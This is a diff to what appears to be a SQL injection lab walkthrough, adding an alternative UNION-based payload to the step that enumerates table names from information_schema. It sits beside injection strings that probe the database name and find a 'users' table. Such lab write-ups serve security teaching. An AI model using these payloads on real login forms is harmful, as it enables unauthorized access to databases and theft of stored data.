@@ -290,6 +290,11 @@ admin123' UNION SELECT 1,2,3 WHERE database() LIKE 's%';--
 admin123' UNION SELECT 1,2,3 FROM information_schema.tables 
 WHERE table_schema = 'sqli_three' AND table_name LIKE 'u%';--
 ```
+or
+```sql
+admin123' UNION SELECT 1,2,table_name FROM information_schema.tables 
+```
+
 - Result: `users` table exists
 
 #### 4️⃣ Find Column Names
